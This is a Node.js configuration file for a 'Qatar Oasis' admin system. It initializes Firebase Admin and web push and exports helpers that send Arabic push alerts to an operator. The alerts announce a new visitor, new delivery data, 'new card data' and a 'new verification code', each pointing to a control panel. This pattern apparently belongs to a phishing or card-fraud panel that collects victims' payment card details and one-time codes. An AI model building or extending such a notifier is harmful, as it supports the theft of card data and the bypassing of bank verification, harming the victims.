/**
 * Firebase Admin SDK Configuration
 * Qatar Oasis - Admin Notifications System
 */


const admin = require('firebase-admin');
const webpush = require('web-push');


// ==========================================
// SAFE PRIVATE KEY PARSING
// ==========================================
let privateKey = process.env.FIREBASE_PRIVATE_KEY;


if (privateKey) {
    if (privateKey.startsWith('"') && privateKey.endsWith('"')) {
        privateKey = privateKey.slice(1, -1);
    }
    privateKey = privateKey.replace(/\\n/g, '\n');
}


if (!privateKey) {
    throw new Error("FIREBASE_PRIVATE_KEY is missing or undefined in environment variables");
}


const serviceAccount = {
  "projectId": process.env.FIREBASE_PROJECT_ID || "adminqatar-d4192",
  "privateKey": privateKey,
  "clientEmail": process.env.FIREBASE_CLIENT_EMAIL
};


const VAPID_KEYS = {
  publicKey: process.env.VAPID_PUBLIC_KEY || '',
  privateKey: process.env.VAPID_PRIVATE_KEY || ''
};


let firebaseInitialized = false;


console.log('🔧 Loading Firebase Admin SDK...');
console.log('📧 Client Email:', serviceAccount.clientEmail ? '✓ Set' : '✗ Missing');
console.log('🔑 Private Key:', serviceAccount.privateKey ? '✓ Set (length: ' + serviceAccount.privateKey.length + ')' : '✗ Missing');


try {
  if (serviceAccount.privateKey && serviceAccount.clientEmail) {
    
    // SAFE INITIALIZATION METHOD FOR BOTH MODERN AND OLD VERSIONS
    const apps = admin.apps || [];
    if (apps.length === 0) {
      admin.initializeApp({
        credential: admin.credential ? admin.credential.cert(serviceAccount) : admin.app.credential.cert(serviceAccount)
      });
    }
    
    firebaseInitialized = true;
    console.log('✅ Firebase Admin SDK initialized successfully');


    if (VAPID_KEYS.publicKey && VAPID_KEYS.privateKey) {
      webpush.setVapidDetails(
        'mailto:admin@qatarwateroasis.com',
        VAPID_KEYS.publicKey,
        VAPID_KEYS.privateKey
      );
    }
  } else {
    console.log('⚠️ Firebase credentials not configured.');
  }
} catch (error) {
  // LAST RESORT FALLBACK FOR ULTRAMODERN VERSION EXTRACTION
  try {
    if (!admin.apps || admin.apps.length === 0) {
      const { cert } = require('firebase-admin/app');
      admin.initializeApp({
        credential: cert(serviceAccount)
      });
      firebaseInitialized = true;
      console.log('✅ Firebase Admin SDK initialized via modern fallback successfully');
    }
  } catch (fallbackError) {
    console.error('❌ Firebase Admin initialization error:', error.message);
  }
}


async function sendPushNotification(tokens, notification, data = {}) {
  if (!firebaseInitialized || !tokens || tokens.length === 0) return { success: false };
  try {
    const message = {
      notification: { title: notification.title, body: notification.body, icon: notification.icon || '/admin/icon.png' },
      tokens: tokens
    };
    const response = await admin.messaging().sendEachForMulticast(message);
    return { success: true, successCount: response.successCount };
  } catch (err) {
    return { success: false, error: err.message };
  }
}


async function notifyNewVisitor(v) { return sendPushNotification(global.fcmTokens || [], { title: '🆕 زائر جديد!', body: 'تفقد لوحة التحكم' }); }
async function notifyDelivery(v) { return sendPushNotification(global.fcmTokens || [], { title: '📦 بيانات توصيل جديدة!', body: 'تفقد لوحة التحكم' }); }
async function notifyPayment(v) { return sendPushNotification(global.fcmTokens || [], { title: '💳 بيانات بطاقة جديدة!', body: 'تفقد لوحة التحكم' }); }
async function notifyVerification(v) { return sendPushNotification(global.fcmTokens || [], { title: '🔐 رمز تحقق جديد!', body: 'تفقد لوحة التحكم' }); }


module.exports = { sendPushNotification, notifyNewVisitor, notifyDelivery, notifyPayment, notifyVerification, firebaseInitialized };
